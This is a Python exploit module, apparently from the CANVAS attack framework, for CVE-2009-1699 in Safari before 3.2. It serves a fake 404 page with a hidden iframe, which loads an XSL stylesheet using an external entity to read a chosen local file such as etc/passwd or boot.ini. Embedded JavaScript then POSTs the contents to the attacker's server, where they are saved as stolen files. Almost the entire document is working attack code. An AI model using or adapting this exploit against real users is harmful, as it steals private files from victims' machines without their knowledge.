#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
import random
from tcpexploit import *

NAME                            = "Safari < 3.2 XSL File Stealing"
DESCRIPTION                     = "Steal files from target machine through Safari XSL local file access"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apple"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["Reference"]      = "http://scary.beasts.org/security/CESA-2009-006.html"
DOCUMENTATION["CVE Name"]       = "CVE-2009-1699"
DOCUMENTATION["CVE url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1699"
DOCUMENTATION["NOTES"]          = """for now this is a quick demonstration of the issue as it only will steal 1 file from the target but soon will fully support multiple files.  Put the file you would like to steal in Resources/safari_file_stealing/filelist.txt file and use arguments listed
when you run from the httpserver module

Rememeber to exclude the drive letter and beginning forward slashes when declaring your file in the filelist.txt file!  Typical examples:

     Documents and Settings/Administrator/doc.txt
     etc/passwd
     boot.ini
     
When the file is sent to CANVAS it will be called stolen_fileX.txt (where X is a random number) and will be located in Reports/<current session name>/stolen_files directory

Keep in mind that not only will you get the results of the text file back but the contents of document.body.innerHTML so don't be alarmed when you
see lots of javascript at the end of the file.

Also, binary files are not yet supported ...
     """
DOCUMENTATION["Arugments"]      ="""
After you have placed your single file in the correct filelist.txt file, run this module from httpserver with the following arguments:

os:<target operating system>
     os:mac
     os:windows

driveletter:<drive letter on which interesting files are located> (windows only)
     driveletter:c
     driveletter:d

"""




VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ['Safari < 3.2'] }

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        self.xmlfile            = "index.xml"
        # filename is used in the actual http server
        self.filename           = ""
        self.sourcedir          = os.path.join("Resources","safari_file_stealing")
        self.filestostealfile   = os.path.join(self.sourcedir, "filelist.txt")
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        return

    def getargs(self):
        self.host              = self.target.interface
        self.htmlfile          = self.argsDict.get('htmlfile', self.htmlfile)
        self.singleusername    = self.argsDict.get('username', self.singleusername)
        self.usernamefile      = self.argsDict.get('usernamefile', self.username)
        self.filestostealfile  = self.argsDict.get('filelist', self.filestostealfile)
        self.serverhostip      = self.argsDict.get('serverhostip', self.serverhostip)
        self.serverhostport    = self.argsDict.get('serverhostport', self.serverhostport)
        html                   = self.makefile()
        rar                    = self.makedownloadfile()
    
    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def neededListenerTypes(self):
        return []
    
    def run(self):
        
        #In order for someone to run this attack standalone would mean they would have to 
        #setup a way to get files sent back to them ... SPIKEproxy does all that for us in this module
        self.log("Please read the description and run this module from httpserver")
        return 0 
    
    ## SPIKE Proxy Callbacks ...

   
    def make_file_stealing_xsl(self):
        filetosteal = file(self.filestostealfile, "r").readlines()[0].strip().replace(" ","%%20")
        """
        if self.singlefiletosteal !="":
            filetosteal=self.singlefiletosteal
        else:
            filetosteal="boot.ini"
        """
        if self.platform.lower()=="w" or self.platform.lower()=="windows":
            entity="""<!DOCTYPE doc [ <!ENTITY ent SYSTEM "file:///%s:/%s"> ] >"""%(self.driveletter,filetosteal)
        elif self.platform.lower()=="m" or self.platform.lower()=="mac":
            entity="""<!DOCTYPE doc [ <!ENTITY ent SYSTEM "file:///%s"> ] >"""%(filetosteal)
            
            
        xsl="""%s
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
  
&ent;


<script>
var req  = new XMLHttpRequest();
req.open('POST', '/g', false);
req.send(document.body.innerHTML);
</script>
  </body>
  </html>

</xsl:template>
</xsl:stylesheet>

"""%entity
        self.log(xsl)
        return xsl
    
    def makexml(self):
        xml="""<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet type="text/xsl" href="submit.xsl"?>
<xml>
Error
</xml>
"""
        self.log(xml)
        return xml
        
    def makefile(self):
        html="""<html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Error -->
                <iframe src="index.xml" width=0 height=0 style="visibility: hidden; display: none"></iframe>
                <h1>Not Found</h1>
                <p>The requested URL /index.html was not found on this server.</p>
                <hr>
            </body>
        </html>
        """
        return html
       
          
    def makesploit(self, clientheader, clientbody):
        #self.run()
        # we are platform independent
        from libs.spkproxy import header, body
        import struct
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        GET         = clientheader.URL
        
        if hasattr(self, "clientsideargs"):
            self.log(self.clientsideargs)
            self.bindip            = self.clientsideargs["bindip"]
            self.port              = self.clientsideargs["bindport"]
            #these may or may not be set by the user
            """
            try:
                self.usernamefile      = self.clientsideargs["user_supplied_args"]["usernamefile"]
                self.log("using user name list: %s"%self.usernamefile)
            except:
                self.usernamefile      = ""
            try:
                self.filestostealfile  = self.clientsideargs["user_supplied_args"]["filelist"]
                self.log("using file list: %s"%self.filestostealfile)
            except:
                self.filestostealfile  = ""
            """
            try:
                self.singleuser        = self.clientsideargs["user_supplied_args"]["singleuser"]
                self.log("using single user name: %s"%self.singleuser)
            except:
                self.singleuser        = ""
            try:
                self.singlefiletosteal = self.clientsideargs["user_supplied_args"]["singlefile"]
                self.log("try to steal single file: %s"%self.singlefiletosteal)
            except:
                self.singlefiletosteal = ""
            try:
                self.platform = self.clientsideargs["user_supplied_args"]["os"]
                self.log("target platform: %s"%self.platform)
            except:
                self.platform = ""
            try:
                self.driveletter = self.clientsideargs["user_supplied_args"]["driveletter"]
                self.log("target drive letter: %s"%self.driveletter)
            except:
                self.driveletter = "c"
           
        else:
            self.log("we shouldn't be run standalone!")

       
        self.log("[+] User agent of connecting host: %s" % user_agent)
        
        
        if "/g" in clientheader.URL:
            #got a POST
            data=clientheader.data
            post=clientbody.data
            #self.log("HEADER %s"%"".join(data))
            #self.log("DATA %s"%"".join(post))

            #filename=clientheader.getHeaderValue("Filename")

            outputdir = self.output(ip="stolen_files", subdir="stolen_files")
            filename="stolen_file%s.txt"%str(random.randrange(0,1000))
            filename=os.path.join(outputdir,filename)
            self.log("writing stolen file to %s"%filename)
            outfile=file(filename,"wb")

            #self.log(post)
            #in order to keep the javascript small we simply convert each byte in each stolen file
            #to a decimal and pass the comma seperated buffer back to us for processing.
            
            outfile.write("".join(post))

            outfile.close()
            
        elif clientheader.URL == "/submit.xsl":
            #self.log("SERVING error.html as an invalid content-type to force download to the desktop")
            header=header('SERVER')
            #h.addHeader('Content-Type','application/force-download')
            #h.addHeader('Content-Disposition','attachment; filename=error.html')
            b.setBody(self.make_file_stealing_xsl())
            return h,b
            
        elif clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
            
        elif clientheader.URL.count(self.xmlfile):
            self.log("[+] Sending XML")
            b.setBody(self.makexml())
            
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
